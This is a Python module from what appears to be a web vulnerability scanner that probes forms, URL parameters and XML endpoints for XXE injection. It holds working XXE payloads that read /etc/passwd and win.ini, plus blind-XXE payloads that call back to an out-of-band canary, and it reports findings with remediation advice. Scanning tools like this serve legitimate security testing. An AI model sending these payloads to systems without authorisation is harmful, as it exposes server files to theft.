import httpx
from typing import List
from scanner.core.scan_result import Finding, Severity
from scanner.core.crawler import CrawlResult
from scanner.utils.http import get_url_params, inject_url_param
from scanner.utils.payloads import load_payloads

UNIX_SIGNATURES = ["root:x:", "root:/root:", "/bin/bash", "daemon:x:"]
WIN_SIGNATURES = ["[extensions]", "[fonts]", "for 16-bit app support"]

_HARDCODED = [
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        UNIX_SIGNATURES,
        "/etc/passwd read",
    ),
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]><root>&xxe;</root>',
        WIN_SIGNATURES,
        "win.ini read",
    ),
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe;]><root/>',
        UNIX_SIGNATURES,
        "/etc/passwd via parameter entity",
    ),
]

def _get_payloads() -> List[tuple]:
    data = load_payloads("xxe")
    if data and isinstance(data.get("payloads"), list):
        try:
            result = []
            for p in data["payloads"]:
                sigs = UNIX_SIGNATURES if p.get("target") == "unix" else WIN_SIGNATURES
                result.append((p["payload"], sigs, p["label"]))
            return result
        except (KeyError, TypeError):
            pass
    return _HARDCODED

XXE_PAYLOADS = _get_payloads()

# Content types that indicate XML-accepting endpoints
XML_CONTENT_TYPES = {"application/xml", "text/xml", "application/xhtml+xml", "application/soap+xml"}


def test(page: CrawlResult, client: httpx.Client, oob=None) -> List[Finding]:
    findings = []

    # Test XML-accepting forms (rare but possible)
    for form in page.forms:
        for payload, signatures, label in XXE_PAYLOADS:
            try:
                resp = client.request(
                    form["method"].upper(),
                    form["action"],
                    content=payload,
                    headers={"Content-Type": "application/xml"},
                )
            except Exception:
                continue
            matched = next((s for s in signatures if s in resp.text), None)
            if matched:
                findings.append(_finding(form["action"], None, payload, label, matched))
                break

    # Test URL params where value looks like XML or param name hints at XML
    xml_hint_params = {"xml", "data", "body", "payload", "input", "query", "request", "content"}
    from scanner.utils.http import get_url_params
    params = get_url_params(page.url)
    for param_name in params:
        if param_name.lower() not in xml_hint_params:
            continue
        for payload, signatures, label in XXE_PAYLOADS:
            test_url = inject_url_param(page.url, param_name, payload)
            try:
                resp = client.get(test_url)
            except Exception:
                continue
            matched = next((s for s in signatures if s in resp.text), None)
            if matched:
                findings.append(_finding(page.url, param_name, payload, label, matched))
                break

    # Test raw POST body to JSON/XML-accepting endpoints
    content_type = page.headers.get("content-type", "")
    if any(ct in content_type for ct in XML_CONTENT_TYPES):
        for payload, signatures, label in XXE_PAYLOADS:
            try:
                resp = client.post(
                    page.url,
                    content=payload,
                    headers={"Content-Type": "application/xml"},
                )
            except Exception:
                continue
            matched = next((s for s in signatures if s in resp.text), None)
            if matched:
                findings.append(_finding(page.url, None, payload, label, matched))
                break

    # Blind XXE via OOB HTTP/DNS callback
    if oob and not findings:
        canary = oob.get_canary()
        oob_payloads = [
            f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{canary}/xxe">]><root>&xxe;</root>',
            f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{canary}/xxe-param"> %xxe;]><root/>',
        ]
        for form in page.forms:
            for oob_payload in oob_payloads:
                try:
                    client.request(form["method"].upper(), form["action"],
                                   content=oob_payload,
                                   headers={"Content-Type": "application/xml"}, timeout=5)
                except Exception:
                    pass
        content_type = page.headers.get("content-type", "")
        if any(ct in content_type for ct in XML_CONTENT_TYPES):
            for oob_payload in oob_payloads:
                try:
                    client.post(page.url, content=oob_payload,
                                headers={"Content-Type": "application/xml"}, timeout=5)
                except Exception:
                    pass

    return findings


def _finding(url: str, param, payload: str, label: str, matched: str) -> Finding:
    return Finding(
        title="XML External Entity (XXE) Injection",
        severity=Severity.CRITICAL,
        url=url,
        parameter=param,
        payload=payload[:80] + "...",
        evidence=f"XXE payload triggered file read ({label}). Content signature '{matched}' found in response.",
        description=(
            "XXE allows attackers to read arbitrary files from the server, perform SSRF, "
            "and in some cases achieve remote code execution via Java/PHP deserialization chains."
        ),
        remediation=(
            "Disable external entity processing in your XML parser. "
            "Use a safe XML parser configuration (e.g., defusedxml in Python). "
            "Prefer JSON over XML for APIs."
        ),
        cwe="CWE-611",
        cvss=9.1,
        owasp_category="A03:2021 Injection",
        standards=["ISO27001-8.23", "HIPAA-164.312a"],
        confidence=1.0,
    )
